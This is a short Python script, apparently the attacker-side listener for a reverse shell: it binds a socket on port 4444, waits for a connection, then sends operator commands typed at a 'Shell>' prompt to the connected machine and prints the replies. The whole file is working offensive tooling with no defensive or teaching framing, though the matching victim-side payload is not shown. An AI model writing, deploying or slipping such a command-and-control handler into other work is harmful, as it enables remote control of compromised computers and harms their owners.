import socket

HOST = '0.0.0.0'
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)
print(f"[+] Listening on {PORT}...")

client, addr = server.accept()
print(f"[+] Connection from {addr}")

while True:
    cmd = input("Shell> ")
    if cmd.strip() == "":
        continue

    client.send(cmd.encode())

    if cmd.lower() == "exit":
        break

    response = client.recv(4096).decode()
    print(response)

client.close()
server.close()
